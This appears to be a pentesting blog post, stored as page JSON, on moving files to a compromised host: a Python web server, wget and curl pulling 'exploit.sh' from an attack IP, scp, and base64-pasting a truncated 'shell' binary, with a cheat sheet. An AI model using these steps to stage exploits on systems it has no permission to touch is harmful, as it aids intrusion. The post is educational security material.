{"pageProps":{"post":{"path":"blog/filesharing-for-pentesters","title":"Quick filesharing techniques for Pentesters","subtitle":"sharing files can be done in various ways..","published":true,"datePublished":1641383870315,"tags":["ctf","filesharing","linux","wget","cheatsheet","hacking"],"description":"Quick filesharing techniques for Pentesters","canonicalUrl":"https://dev.lwlx.xyz/blog/filesharing-for-pentesters","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/default","thumbnailPhoto":"/default.jpg","content":"\n# **Transferring Files**\n\n---\n\nDuring any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.\n\n---\n\n# **Using wget**\n\nThere are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:\n\n```\nlwlx@cybertap[/cybertap]$ cd /tmp\nlwlx@cybertap[/cybertap]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n\n```\n\nNow that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:\n\n```\nuser@remotehost$ wget http://10.10.14.1:8000/exploit.sh......\nSaving to: 'exploit.sh'\n\nexploit.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s\n\n2021-02-08 18:09:19 (8.16 MB/s) - 'exploit.sh' saved [14337/14337]\n\n```\n\nNote that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:\n\n```\nuser@remotehost$ curl http://10.10.14.1:8000/exploit.sh -o exploit.sh\n100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k\n\n```\n\nNote that we used the `-o` flag to specify the output file name.\n\n---\n\n# **Using SCP**\n\nAnother method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:\n\n```\nlwlx@cybertap[/cybertap]$ scp exploit.sh user@remotehost:/tmp/exploit.shuser@remotehost's password: **********\nexploit.sh\n\n```\n\nNote that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.\n\n---\n\n# **Using Base64**\n\nIn some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:\n\n```\nlwlx@cybertap[/cybertap]$ base64 shell -w 0f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA.....lIuy9iaW4vc2gAU0iJ51JXSInmDwU\n\n```\n\nNow, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:\n\n```\nuser@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA.....lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell\n```\n\n---\n\n# **Validating File Transfers**\n\nTo validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:\n\n```\nuser@remotehost$ file shell\nshell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header\n\n```\n\nAs we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:\n\n```\nlwlx@cybertap[/cybertap]$ md5sum shell\n321de1d7e7c3735838890a72c9ae7d1d shell\n\n```\n\nNow, we can go to the remote server and run the same command on the file we transferred:\n\n```\nuser@remotehost$ md5sum shell\n321de1d7e7c3735838890a72c9ae7d1d shell\n\n```\n\nAs we can see, both files have the same md5 hash, meaning the file was transferred correctly. There are various other methods for transferring files.\n\n\n\n# CheatSheet\n\n<table>\n<thead>\n  <tr>\n    <th colspan=\"2\">Transferring Files</th>\n  </tr>\n</thead>\n<tbody>\n  <tr>\n    <td><code>python3 -m http.server 8000<code></td>\n    <td>Start a local webserver</td>\n  </tr>\n  <tr>\n    <td><code>wget http://10.10.14.1:8000/exploit.sh<code></td>\n    <td>Download a file on the remote server from our local machine</td>\n  </tr>\n  <tr>\n    <td><code>curl http://10.10.14.1:8000/exploit.sh -o exploit.sh<code></td>\n    <td>Download a file on the remote server from our local machine</td>\n  </tr>\n  <tr>\n    <td><code>scp exploit.sh user@remotehost:/tmp/exploit.sh<code></td>\n    <td>Transfer a file to the remote server with scp (requires SSH access)</td>\n  </tr>\n  <tr>\n    <td><code>base64 shell -w 0<code></td>\n    <td>Convert a file to base64</td>\n  </tr>\n  <tr>\n    <td><code>echo f0VMR...SNIO...InmDwU | base64 -d &gt; shell</code></td>\n    <td>Convert a file from <code>base64<code> back to its orig</td>\n  </tr>\n  <tr>\n    <td><code>md5sum shell<code></td>\n    <td>Check the file's <code>md5sum<code> to ensure it converted correctly</td>\n  </tr>\n</tbody>\n</table>"}},"__N_SSG":true}